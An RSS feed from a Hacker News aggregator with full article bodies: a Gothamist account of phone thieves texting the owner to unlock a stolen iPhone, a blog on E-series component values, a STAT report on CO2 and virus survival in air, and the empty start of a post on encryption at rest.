<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0">
    <channel>
        <title>HN100 - Readable Contents</title>
        <link>https://hn.algolia.com/api/v1/search_by_date?tags=%28story,poll%29&amp;numericFilters=points%3E100</link>
        <description>Uses Readability to add bodies to the RSS feed</description>
        <lastBuildDate>Tue, 04 Jun 2024 21:30:04 GMT</lastBuildDate>
        <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
        <generator>https://github.com/jpmonette/feed</generator>
        <language>en</language>
        <item>
            <title><![CDATA[Things the guys who stole my phone have texted me to try to get me to unlock it (124 pts)]]></title>
            <link>https://gothamist.com/news/things-the-guys-who-stole-my-phone-have-texted-me-to-try-to-get-me-to-unlock-it</link>
            <guid>40578460</guid>
            <pubDate>Tue, 04 Jun 2024 20:10:23 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://gothamist.com/news/things-the-guys-who-stole-my-phone-have-texted-me-to-try-to-get-me-to-unlock-it">https://gothamist.com/news/things-the-guys-who-stole-my-phone-have-texted-me-to-try-to-get-me-to-unlock-it</a>, See on <a href="https://news.ycombinator.com/item?id=40578460">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><!--[--><!--[--><div><p><i>A version of this story originally appeared in</i> <a href="https://maxread.substack.com/p/iphone-thieves-copypasta" rel="noopener" target="_blank"><i>Read Max</i></a><i>, a twice-weekly newsletter about tech, politics, culture, and media.</i></p><p>My phone was stolen in early March, most likely while I was standing on the platform at the York Street station waiting for the F train. Fifteen minutes later, in a food hall under the movie theater where my boyfriend and I were supposed to see “Dune 2,” I reached into my pocket and realized it was gone. He looked at the Find My app on his phone: My phone was “last seen” at York Street but wasn’t registering a current location. Someone had turned it off.</p><p>As quickly as possible, I did <a href="https://support.apple.com/en-us/101593" rel="noopener" target="_blank">all the things you’re supposed to do when your phone is lost or stolen</a> —- mark it as lost, cut off service, and remotely erase it. I spent the rest of the night anxiously refreshing the Find My app, watching my phone move around Manhattan before it finally stopped at Rockefeller Center. I didn’t bother confronting the thief. Worst of all, we didn't even see “Dune 2.”</p><p>After two hours in the Williamsburg Apple Store the next morning, I had a new iPhone 15 and I stopped stressing. As long as I didn’t remove the phone from my Apple account or the Find My app, the phone was essentially bricked to anyone without the passcode <i>and</i> my iCloud password — unusable by the thieves, or the fences who I assume bought it from them. Now my phone was their problem.</p><p>Where had my phone gone? I learned (from Reddit comments – where else?) that stolen iPhones usually end up sold in bulk online, either directly by the thief or by a fence who buys stolen phones individually and <i>then</i> sells them in bulk. The purchasers are either <a href="https://www.reddit.com/r/Flipping/comments/fw7s3v/my_experience_with_liquidationcom/" rel="noopener" target="_blank">looking for parts</a> or think they can crack into the phones, wipe and resell them. This teenager on YouTube, for example, <a href="https://www.youtube.com/watch?v=26bdjJqWdCo" rel="noopener" target="_blank">bought a box of stolen iPhones</a> for $1,300 on Liquidation.com:</p></div><!--]--><!--[--><div><p>
    <iframe width="200" height="113" src="https://www.youtube.com/embed/26bdjJqWdCo?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen="" title="I Bought STOLEN iPhones for CHEAP"></iframe>
</p>
</div><!--]--><!--[--><div><p>As you can see, most of the phones she tried didn’t have passcodes but were still linked to iCloud accounts, which meant she (or anyone buying the phones) still had access to all of the original owners’ texts, emails and photos. She sent a message to each iCloud email offering to give people their phones back, but only one guy replied.</p><p>I, sadly, did not get a message from a teenage YouTuber earnestly offering to return my stolen phone. Instead I received a series of texts from someone cycling through a number of different strategies for engaging, convincing, tricking or scaring me into unlocking the phone for them.</p><p>Rather than being engaged, convinced, tricked or scared, however, I was delighted. The experience managed to combine the internet's promises of international communion and international crime.</p><p>There was something oddly soothing about being in touch with the people who’d stolen my phone. Instead of it disappearing into the ether, I knew more or less where it was, and thanks to these texts, I knew that it was a source of frustration to the people who’d gotten their hands on it. As the texts escalated in complexity and rage, I sympathized with their plight. I mean, not enough to unlock my phone. But we’ve all been there – sometimes you get stuck with a difficult project at work.</p><p>In case you find yourself in a similar situation, here are some things the guys who stole (or later purchased) my iPhone have told me to try to get me to unlock it.</p></div><!--]--><!--[--><p><h5><b>1) “Your iPhone 14 Pro is trying to pay with Apple Pay in China.”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>The first text I received from the scammers.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>The first text I got from my new friends was sent on April 28, a few weeks after the phone was stolen, and I have to be honest … it kind of got me, at least for a second. It helped that, even though this text came from a clearly bogus iCloud email address, Apple’s own “helpful” iMessage feature was sort of fooled: the auto-filled contact name said “Maybe: Apple Pay.” Maybe!</p><!--]--><!--[--><figure><figcaption><!----><p>Apple’s own “helpful” iMessage feature was sort of fooled: the auto-filled contact name said “Maybe: Apple Pay.” Maybe!</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>At this point, my phone was in Sunnyside, Queens:</p><!--]--><!--[--><figure><figcaption><!----><p>My phone was camped out in Sunnyside, Queens for a bit.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>My old phone's new owners persisted with this tactic for a while. I later got the same message again, but from a different iCloud address. Two weeks after that, on May 12, I got an identical message in which “USA” had been replaced with “China.” I'm guessing it was intended to dial up the panic, but instead it made me feel cosmopolitan and sophisticated.</p><!--]--><!--[--><p><h5><b>2) “Iv'e bought an iPhone 14 Pro I'm using, it have your messages, emails, cards, bank, notes and personal information on it”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>Posing as the unwitting new owners of a stolen iPhone, the scammer continued to try to get me to unlock the phone.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>On May 13, my pen pals reached out from a Filipino phone number. They'd switched from the impersonal "Apple Pay warning" texts to claiming that they were the unwitting new owners of a stolen iPhone. I appreciated this more intimate approach – the message even came from a phone number rather than email address, which was a nice touch – and I was glad to hear they were concerned about my insurance claim. “Best of luck!” I texted back.</p><!--]--><!--[--><p><h5><b>3) “Your old iPhone 14 Pro is recycled by us, we are just recycling merchants, we are not the ones who steal your phone”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>This was my favorite text. Who am I to say no to recycling?</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>The next day, I was kindly contacted by a U.K. phone number notifying me that the people in possession of my phone simply wanted to recycle it. This was one of my favorites: Sure, there’s an implicit threat (“hackers” might “contact my family” to, what, send them thousands of photos of my dog??), but it's not just some poor sap I'm supposed to help, it's the <i>planet</i>. Who am I to stand in the way of recycling? I replied:</p><!--]--><!--[--><figure><figcaption><!----><p>I loved lying to the scammers.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p><h5><b>4) “The phone is going be auctioned on the black market with your personal information and everything about you that you had on it.”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>I appreciated the use of CAPS in this one.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>I got this one on the same day (May 14), from the Filipino number, which had previously claimed to be some guy who’d accidentally bought my phone.</p><!--]--><!--[--><p><h5><b>5) “Your old iPhone has been disassembled… you do not want to take it back, because it does not belong to the law of the United States”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>This is where things started escalating.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><div><p>At the same time, I got this nearly identical message from the U.K. number. Thanks to Reddit, I discovered that most of the messages I was getting were <a href="https://www.reddit.com/r/iphone/comments/1abu8ec/my_phone_got_stolen_and_this_is_what_they_texted/" rel="noopener" target="_blank">scammer copypasta</a>: English phrases and texts that were passed around between thieves, fences and jailbreakers to entice bereft phone owners like me.</p><p>In the end I think these two texts provide a lesson in the importance of great openers. While the previous message didn’t move me much, it’s hard not to admire the arresting visuals of the detailed iPhone breakdown, the reference to “the law of the United States,” the mocking “you’ll never catch me.” It’s an incredible intro that really elevates the literary value of what would otherwise be a rote bit of vaguely threatening text! ! ! ! ! !</p><p>In any event, I will credit them with being honest: I checked Find My and my phone was indeed in China. It looked like it was in an office building conveniently located around the corner from an Adidas store, about 8,000 miles from me.</p></div><!--]--><!--[--><figure><figcaption><!----><p>My iPhone took a little trip!</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p><h5><b>6) “Listen! I'm going to harassed, wreck and ruin your sad, stupid low pathetic life if its not removed you mindless peasant.”</b></h5></p><!--]--><!--[--><figure><figcaption><!----><p>This was the final (and most threatening) message I received from my scammer friends.</p><p>Veronica de Souza/Gothamist</p></figcaption></figure><!--]--><!--[--><p>I did not like this tone from my best pal! This text (more <a href="https://www.reddit.com/r/copypasta/comments/13tv0r3/someone_who_got_their_iphone_stolen_got_this/" rel="noopener" target="_blank">scammer copypasta</a>) was accompanied by two videos. One video showed a “hacker” breaking into someone’s iPhone and going through their camera roll, which was a mix of selfies and graphic videos. Another appeared to be a screen recording of a social video of a man showing off his gun. I guess this is supposed to be the guy named “Miami” who is going to come kill me and my whole family “on Monday.” I haven’t heard from them since.</p><!--]--><!--]--></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Why do electronic components have such odd values? (2021) (194 pts)]]></title>
            <link>https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/</link>
            <guid>40576132</guid>
            <pubDate>Tue, 04 Jun 2024 16:20:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/">https://digilent.com/blog/why-do-electronic-components-have-such-odd-values/</a>, See on <a href="https://news.ycombinator.com/item?id=40576132">Hacker News</a></p>
<div id="readability-page-1" class="page"><article id="post-4381">
	<!-- .entry-header -->

	<div>
		<p>If you’ve been around electronics for a while, you’ve probably noticed that components like resistors, capacitors, zener diodes, and inductors come in some odd values. Looking at the chart below, there seems to be no clear rationale&nbsp;behind the values, but there is a pattern. 47kΩ resistors and 22μF capacitors are everywhere, but not 40kΩ or 50kΩ resistors, or 20μF or 30μF capacitors. So what’s the deal? It all has to do with <a href="http://en.wikipedia.org/wiki/Preferred_number" target="_blank" rel="noopener">preferred numbers</a>.</p>
<p><a href="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png"><img fetchpriority="high" decoding="async" src="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-600x600.png" alt="resistor-color-codes" width="600" height="600" srcset="https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes.png 600w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-150x150.png 150w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-225x225.png 225w, https://digilent.com/blog/wp-content/uploads/2015/01/resistor-color-codes-300x300-cropped.png 300w" sizes="(max-width: 600px) 100vw, 600px"></a></p>
<p>We have to go back a few years to 1877 France. The French military used balloons for various purposes and of various sizes, and they had to be anchored using cables. Over time, they ended up with 425 different sizes of mooring cables that had to be individually ordered and inventoried. Talk about a nightmare.</p>
<p>Enter Charles Renard. He was tasked with improving the balloons, but discovered this rat’s nest of cables in the inventory closet instead. He spent some time thinking about it and came up with a series of 17 cable sizes that would allow for every type of balloon to be properly moored. Each size of cable had a max/min rating that just overlapped it’s neighbor above and below, so every required value was covered by one or more cable. This system of numbers became known as the “Renard numbers” and was later included in the&nbsp;“preferred numbers” when the concept was expanded for other applications and became an international standard with ISO (International Organization for Standards) 3 in 1952.</p>
<p>Since then, numerous international standards have been adopted by ISO for countless things, but one of those is how we identify&nbsp;certain electronic components. Using the same idea that Renard developed, these components are labeled with what are known as E-series values within the preferred number system. The lowest value is E6, which enumerates six&nbsp;values between&nbsp;two consecutive powers of 10, i.e., between 10 and 100 or between 10k and 100k. Starting with 10, we increase that value by roughly half and we get 15. Increase by roughly half again and we get 22. Continuing this trend, rounding as needed, and we end up with the series 10, 15, 22, 33, 47, and 68. Components built to the E6 standard have a 20% relative error tolerance, and if we look at the values again we’ll see a trend. Starting with 10 again and adding 20% error we end up with 12. Moving to 15 and subtracting 20% we get… wait for it… 12. Moving up from 15 we get 15 + 20% = 18 and 22 – 20% = 17.6. This trend repeats no matter what range of powers of 10 you use, as long as they are consecutive. So 47kΩ&nbsp;+ 20% = 56400, while 68kΩ – 20% = 54400.</p>
<p>Look again at the values 47 and 68. The max/min values overlap right about 56, don’t they? That sounds familiar. The E12 standard uses all of the same values as E6, but with 6 more values mixed in. These 6 additional values are roughly where the E6 values overlap, and now in order to cover the entire range our %-error is reduced to 10%. Starting again at 10, we have 10, 12, 15, 18, 22, 27, 33, 39, 47, 56, 68, and 82. The math holds true here as well, with the error values just slightly overlapping.</p>
<p>There are four&nbsp;more E-series as well, namely E24, E48, E96, and E192. The image above lists all values included in the E6/E12/E24 standards. With each doubling of&nbsp;values between consecutive powers of 10, there is an associated halving of the %-error allowance as well. So E24 values have a +/- %-error of 5%, E48 is set at 2%, and so on. The values associated with E192 are also available with 0.25% and 0.1% tolerances, and E24 and E96 are also available with 1% tolerances.</p>
<p>Below is a simple graphical view of how the E12 values relate to one another. Along the bottom of the graph you will see the first 13 terms&nbsp;of an ideal geometric sequence as well. (The sequence is given by y=10^(<em>i</em>/<em>b</em>), where <em>b</em> is the value of the series (e.g. 12) and <em>i</em> is the term desired (e.g. the 8th term would yield 10^(8/12)=4.64).) Notice how closely the values are related.</p>
<figure id="attachment_4382" aria-describedby="caption-attachment-4382"><a href="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_.png"><img decoding="async" src="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_-343x600.png" alt="E12_series_tolerance.svg" width="343" height="600" srcset="https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_.png 343w, https://digilent.com/blog/wp-content/uploads/2015/01/E12_series_tolerance.svg_-129x225.png 129w" sizes="(max-width: 343px) 100vw, 343px"></a><figcaption id="caption-attachment-4382">This graph shows how any value between 1 and 10 is within ±10% of an E12 series value, and its difference from the ideal value in a geometric sequence. By Anders Andersson from <a href="http://commons.wikimedia.org/wiki/File%3AE12_series_tolerance.svg" target="_blank" rel="noopener">Wikimedia Commons</a>.</figcaption></figure>
<p>While it is possible to have a 3.3kΩ resistor with 20% tolerance test out between 2.64kΩ and 3.96kΩ, I would be hesitant to use it. I want 3.3kΩ, so I tend to use resistors with a higher tolerance, usually 5%, so I can just reach in my bin and know that I’m reasonably close. Looking back at the table in the beginning,&nbsp;we see that there are values of 68 and 75 listed. If I’m looking for a value of 70 (or some multiple power of 10, like 700), what can I do to achieve it? I can certainly start testing every 68 valued resistor I can find (75 is just out of range of 5% tolerance), hoping to find one that is just right, but just because it says 5%, doesn’t mean it is. That is a maximum allowance, and my experience has been that the tolerances are much tighter than that. I could go up to an E96 (681 0r 715) or even E192 (698!), but resistors with that level of %-error tolerance are not common and cost more. I just want something simple that I already have in my bin! The answer is actually quite simple. Just add a 33 and a 47 and call it good. You get your 70 +/- whatever tolerance you want since 33 and 47 are preferred numbers in every E-series. The point is that any value can be made for any circuit requirement simply by adding components together. When you throw in the rules for calculating components in series and parallel, the combinations are endless.</p>

         
        
                    <!--begin code -->

                    
                    <div data-post_id="30055" data-instance_id="1" data-additional_class="pp-multiple-authors-layout-boxed.multiple-authors-target-the-content" data-original_class="pp-multiple-authors-boxes-wrapper pp-multiple-authors-wrapper box-post-id-30055 box-instance-id-1">
                                                                                                                                    <p><span>
                                                                                                                        <ul>

                                                                                                                    <li>
                                                                                                                                                                                    <div>
                                                                    <p><img alt="Brandon Marcum" src="https://secure.gravatar.com/avatar/759a6fe8a05fd65a78b981319973577c?s=80&amp;d=mm&amp;r=g" srcset="https://secure.gravatar.com/avatar/759a6fe8a05fd65a78b981319973577c?s=160&amp;d=mm&amp;r=g 2x" height="80" width="80">                                                                                                                                                                                                            </p>
                                                                                                                                    </div>
                                                            
                                                            
                                                                                                                                                                                                                        </li>
                                                                                                                                                                                                                                    </ul>
                                                                            </span>
                                                                                                                        </p></div>
                    <!--end code -->
                    
                
                                
                
        	</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[CO2 helps viruses stay alive longer in the air (103 pts)]]></title>
            <link>https://www.statnews.com/2024/06/04/co2-ventilation-research-virus-airborne-life-haddrell-celebs/</link>
            <guid>40575081</guid>
            <pubDate>Tue, 04 Jun 2024 14:36:49 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.statnews.com/2024/06/04/co2-ventilation-research-virus-airborne-life-haddrell-celebs/">https://www.statnews.com/2024/06/04/co2-ventilation-research-virus-airborne-life-haddrell-celebs/</a>, See on <a href="https://news.ycombinator.com/item?id=40575081">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
	<p><span><span>C</span></span>arbon dioxide monitors have been around for decades. But in 2020, they became, almost overnight, a hot commodity. All of a sudden, people wanted them to help assess the safety of indoor spaces — to gauge the likelihood of breathing in coronavirus-laced particles that until very recently had been in someone else’s lungs.</p>
<p>No sensor can monitor how many infectious aerosols are swirling around us in real time. But carbon dioxide, or CO2, can act as a convenient proxy. People exhale it when they breathe, and in spaces that aren’t well ventilated, the gas accumulates. High CO2 concentrations can provide a warning sign that a lot of the air you’re inhaling is coming out of other people’s respiratory tracts.</p>
<p>For decades, that’s how aerosol scientists and ventilation engineers have mostly thought about CO2 — as a sort of indicator for the health of indoor environments. But over the last three years, researchers in the U.K. working with next-generation bioaerosol technologies have discovered that CO2 is more than a useful bystander. In fact, it plays a critical role in determining how long viruses can stay alive in the air: The more CO2 there is, the more virus-friendly the air becomes.</p>
<p>It’s a revelation that is already transforming the way scientists study airborne pathogens. But on a planet where burning fossil fuels and other industrial activities inject 37 billion metric tons of CO2 into the atmosphere each year, it could also have huge implications for human health.</p>
		
		
<p>“By increasing the CO2 in the air, we’re getting rid of a natural means by which viruses become inactivated,” said Allen Haddrell, an environmental chemist at the University of Bristol Aerosol Research Center, who led the new work. “It’s fascinating, but it’s also horrifying.”</p>
<p><span><span>H</span></span>addrell has spent his career designing instruments to better understand the complex chemical reactions that take place in the violent moments after someone coughs, sneezes, or breathes respiratory particles out. The reactions within those flecks determine how far they can float and how long they can linger in the air. In 2013, Haddrell was approached by the U.K.’s Defense Science and Technology Laboratory about making a machine to study how long bacteria can live inside these particles.</p>
<p>For the better part of a century, scientists have done those experiments with an instrument called a nebulizer, which creates a cloud of aerosols from liquids and releases them into a rotating drum. Then they wait and take time-stamped samples of the air inside the drum to calculate a given pathogen’s half-life: how long it can stay alive and aloft.</p>
<p>The trouble is, these nebulizers create complex plumes of particles, with different sizes and ages, so it can be difficult to know exactly what’s being measured. All the tumbling can give microbes a beating, too, making it difficult to interpret data about their viability. The British government’s military research arm wanted better information to help it prepare for a potential bioterrorism attack.</p>
<p>Making an instrument that could provide such information would turn into a six-year slog. Initially, Haddrell tried to adapt a technology known as “optical tweezers,” developed by a colleague of his at Bristol named Jonathan Reid. It uses lasers to trap particles in a microscope for extended periods of time, allowing researchers to measure the light scattering off of them to determine their physical and chemical properties. But bacteria — with all their proteins, fats, and other biomolecules — created patterns too complicated to fully understand.</p>
<p>Eventually, Haddrell, Reid, and a small team of Ph.D. students and postdocs turned to piezoelectronics. They could harness tiny charges of electricity to force fluid out under carefully controlled pressure, forming a perfect liquid bead — each with exactly the same chemical composition, size, and number of viral particles.</p>
<p>Instead of a rotating drum, Haddrell’s team built an electrodynamic force field to trap each tiny particle in mid-air at the moment of its creation. Using a laser and a camera, they could watch each hovering particle move and change as they exposed it to different environmental conditions. Once they’d measured the particles’ size and chemical composition, they could turn off the electrodynamic field, sending the beads plummeting into a Petri dish to be cultured.</p>
<p>The researchers called the contraption CELEBS, for “controlled electrodynamic levitation and extraction of bioaerosols onto a substrate,” and by 2019, they’d <a href="https://royalsocietypublishing.org/doi/10.1098/rsif.2018.0779" target="_blank" rel="noopener">shown it could work quite well</a> for benchmark bacteria like E. coli. The plan was to move on to other, more concerning airborne bacterial threats.</p>
<p>Then, a novel coronavirus emerged in China and began sickening millions of people all over the world.</p>
		
		
<p><span><span>O</span></span>n March 23, 2020, the same day Prime Minister Boris Johnson announced a nationwide lockdown to curb the widening outbreak of SARS-CoV-2, Haddrell got an email from a colleague at Bristol’s veterinary school, located on a farm about a 40-minute drive south. They were standing up a Containment Level 3 laboratory there and assembling a multidisciplinary rapid response team to study the virus. Could he get his CELEBS system working there, so they could learn more about how it behaved in respiratory particles?</p>
<p>“It was wild,” recalled Haddrell. “I went from thinking I would be home for the next three to six months to driving down there the next day.”</p>
<figure id="attachment_1165502"><a href="https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1.jpeg"><img fetchpriority="high" decoding="async" src="https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-328x437.jpeg" alt="Portrait of Allen Haddrell wearing a green shirt, with yellowish/green bushes behind him. -- infectious disease coverage from STAT" width="328" height="437" srcset="https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-328x437.jpeg 328w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-1024x1365.jpeg 1024w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-768x1024.jpeg 768w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-500x667.jpeg 500w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-640x853.jpeg 640w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1-432x576.jpeg 432w, https://www.statnews.com/wp-content/uploads/2024/06/IMG_5044-1.jpeg 1536w" sizes="(max-width: 328px) 100vw, 328px"></a><figcaption><span>Allen Haddrell</span> <cite>Courtesy Hannah Craven</cite></figcaption></figure>
<p>As the country shut down and the roads emptied of cars, Haddrell began building a high-containment version of his machine. While he did that, a postdoc named Henry Oswin took an existing CELEBS and got it calibrated to work with a mouse virus so they’d be ready to move on to SARS-CoV-2 as soon as the lab opened.</p>
<p>Around that time, researchers using traditional rotating drums began to report <a href="https://www.statnews.com/2020/03/16/coronavirus-can-become-aerosol-doesnt-mean-doomed/">the first survivability data for the new coronavirus</a>. One group, at the National Institute of Allergy and Infectious Diseases, found <a href="https://www.nejm.org/doi/10.1056/NEJMc2004973" target="_blank" rel="noopener">SARS-CoV-2 could stay viable in aerosols for up to three hours</a>. Another, from Tulane University, found it could live in the air for <a href="https://www.medrxiv.org/content/10.1101/2020.04.13.20063784v1" target="_blank" rel="noopener">over 16 hours</a>. The divergent findings added to the confusion as officials crafted public health policies in those first months of the pandemic — when Americans were encouraged first not to wear medical-grade masks, <a href="https://www.statnews.com/2020/04/03/white-house-urges-masks-coronavirus/">then to wear homemade cloth coverings</a>.</p>
<p>But when Haddrell’s team finally began their own experiments with SARS-CoV-2 in the fall of that year, they found the virus lost 90% of its ability to infect people within 20 minutes — with most of the loss occurring within the first five minutes.</p>
<p>Haddrell knew that going public with this information was going to be tricky. Because it had come from a totally novel technology, it would be easy to disregard the data as an artifact of an untested method. He wanted to make sure they had an explanation for why, in their hands, the coronavirus decayed much more quickly. So his team spent another year doing experiments and arguing over hypotheses on the daily drives to and from the new lab. Finally, they settled on a possible answer.</p>
<p>In biology labs, viruses are kept alive inside of cell cultures, where the byproducts of eating and growing can drive up the pH to dangerously alkaline levels. To keep that from happening, most culture media contains dissolved bicarbonate, which together with the carbon dioxide gas inside an incubator creates a buffering system.</p>
		
		
<p>Inside a nebulizer, though, these virus-laced bicarbonate solutions become aerosolized, releasing CO2 that builds up if it’s in a confined space. Haddrell’s team found that a standard nebulizer spraying cell culture media could raise the concentration of CO2 in a 7-liter box from 700 parts per million to over 1,100 over the course of 10 minutes. That extra CO2 acted like a buffer keeping the particles closer to a neutral pH, where respiratory viruses are quite content.</p>
<p>In the CELEBS system, that didn’t happen. As particles lost water through evaporation, they rapidly became more basic, which killed any SARS-CoV-2 viruses inside. Haddrell and his team proposed that pH, more than temperature and humidity, was the driving force behind viral decay in respiratory particles. And the method most widely used to study that had been incidentally altering pH without anyone realizing it.</p>
<p><span><span>I</span></span>f they were right, it would call into question decades of data produced by virology research groups around the world. So when Haddrell’s team posted their own results as <a href="https://www.medrxiv.org/content/10.1101/2022.01.08.22268944v1.full.pdf" target="_blank" rel="noopener">a preprint </a>in January 2022, they expected a bit of blowback. What they got was a hurricane.</p>
<p>“The headline is VERY convenient for people in power” tweeted Jose-Luis Jimenez, an atmospheric chemist at the University of Colorado, referencing <a href="https://www.theguardian.com/world/2022/jan/11/covid-loses-90-of-ability-to-infect-within-five-minutes-in-air-study" target="_blank" rel="noopener">a Guardian article about the research</a>. “Now they can quote an aerosol preprint to keep doing nothing… [Wonder if they’ll forget not reviewed?]” Other leading aerosol scientists <a href="https://twitter.com/jljcolorado/status/1480927297926479884" target="_blank" rel="noopener">quickly piled on</a>.</p>
<p>Haddrell, who wasn’t active on the social media site at the time, had unknowingly waded into a blistering online feud among researchers <a href="https://www.wired.com/story/the-teeny-tiny-scientific-screwup-that-helped-covid-kill/" target="_blank" rel="noopener">about the extent to which SARS-CoV-2 was airborne</a>. If it could travel through the air and infect people via inhalation, even over short distances, then social distancing and handwashing wasn’t going to be enough to curb its spread — masking and ventilation would also be required.</p>
<p>The controversy hinged on differences in how aerosol scientists and medical professionals used words like “aerosol” and “airborne,” <a href="https://www.statnews.com/2024/04/18/covid-airborne-transmission-disease-who-expanded-definition/#:~:text=Even%20as%20evidence%20grew%20that,was%20airborne%20until%20late%202021.">differences the World Health Organization only recently resolved</a>. But in 2022, many feared that at the precise time when the Delta variant was filling up hospital wards across the U.K. with Covid patients, Haddrell’s data would be wrongly interpreted as casting doubt on the airborne route of transmission.</p>
<p>“That’s not what we were saying at all,” Haddrell said. “When Fox News emailed us, we knew we had a problem,” he said.</p>
<p>So when his group used CELEBS to systematically tease apart all the fundamental processes that could be causing SARS-CoV-2 to die in respiratory particles — temperature, humidity, salt content — and still found that pH played the biggest role, they didn’t put out the results as a preprint before it was <a href="https://royalsocietypublishing.org/doi/10.1098/rsif.2023.0062" target="_blank" rel="noopener">published</a> last summer. He also took to X, formerly Twitter, to explain what this finding meant in practical, pandemic terms: “Anything that reduces the acid content of the air will lower the aerosolized viral load #ventilation,” he wrote.</p>
<p>That’s because the human body is not unlike those nebulizers. We, too, carry around dissolved CO2 in the form of bicarbonate, which our blood transports from all our remote tissues into our lungs. When we exhale, and the bicarbonate inside our respiratory particles comes into contact with the outside air, it quickly breaks down and escapes as CO2 gas. If we’re in an enclosed space, that CO2 sticks around, limiting how high the pH inside those particles can climb — just like inside the rotating drums.</p>
<p>But that still left the question: How much CO2 is necessary to boost the odds of viral survival? The <a href="https://www.nature.com/articles/s41467-024-47777-5" target="_blank" rel="noopener">latest paper</a> from Haddrell’s group, published in Nature Communications in April, found a disconcerting answer: not nearly as much as you might think. Increasing the CO2 concentration to just 800 parts per million, a level widely identified as being a marker of good ventilation, significantly extended the life spans of multiple SARS-CoV-2 variants. At higher concentrations — like those you might expect to find in a crowded, poorly ventilated room — Haddrell’s team found that 10 times as much virus remained infectious after 40 minutes when compared to clean air.</p>
		
		
<p><span><span>T</span></span>ogether, the papers make a case for the need to improve the quality of indoor air, said Josh Santarpia, an expert in aerosol transmission of disease at the University of Nebraska Medical Center who was not involved in the study. “It’s not just that your exposure is higher, but the risk is also higher because there are more things that are staying alive,” he said. “It demonstrates the compounded nature of poor ventilation.”</p>
<p>Jimenez, who had been critical of Haddrell’s 2022 preprint and the subsequent media coverage, described the Bristol group’s latest work as “very important” in the push for stronger policies that regulate indoor air. In March, he and a group of international experts <a href="https://www.science.org/doi/10.1126/science.adl0677" target="_blank" rel="noopener">writing in Science</a> presented a blueprint for national indoor air standards in public buildings, aiming to reduce both disease transmission and indoor pollutants.</p>
<p>In its call to action, the group proposed CO2 as one of three key metrics, suggesting ventilation rates that would keep CO2 levels at 800 parts per million or below. Lidia Morawska, an aerosol expert at Queensland University of Technology who was also an author on the Science perspective, told STAT that the Bristol work indicates that number might be too conservative.</p>
<p>“This is another argument for lowering the concentration of CO2 as much as we can,” Morawska said. “It’s moving from a role of being just a proxy to being understood as an enhancer, if we can use this term, for infection.”</p>
<p>Other aerosol experts who have studied SARS-CoV-2 extensively, like Linsey Marr at Virginia Tech, aren’t convinced that CO2 and pH are the whole story. “There are still many details we don’t understand about virus survival in respiratory particles,” she told STAT via email. “Their explanation might be right, but it might not.”</p>
<p>Haddrell agrees that more work needs to be done to understand how widely generalizable the phenomenon is. His team is now gearing up to begin more experiments with influenza A viruses.</p>
<p>But others are also taking up the reins. The Bristol group has now sent CELEBS machines to a handful of other labs, including Morawska’s in Australia and some in the U.S. With the recent spread of <a href="https://www.statnews.com/topic/h5n1-bird-flu/">H5N1 bird flu</a> into many mammal species, including dairy cattle and <a href="https://www.statnews.com/2024/05/30/bird-flu-third-case-human-infection-caused-respiratory-symptoms/">farmworkers who care for them</a>, and the continuing rise in atmospheric CO2 levels, understanding the complex interplay between viruses, human bodies, and the environments where they eat, sleep, and breathe, is only growing more urgent.</p>
</section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Encryption at Rest: Whose Threat Model Is It Anyway? (180 pts)]]></title>
            <link>https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</link>
            <guid>40573211</guid>
            <pubDate>Tue, 04 Jun 2024 11:25:18 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/">https://scottarc.blog/2024/06/02/encryption-at-rest-whose-threat-model-is-it-anyway/</a>, See on <a href="https://news.ycombinator.com/item?id=40573211">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
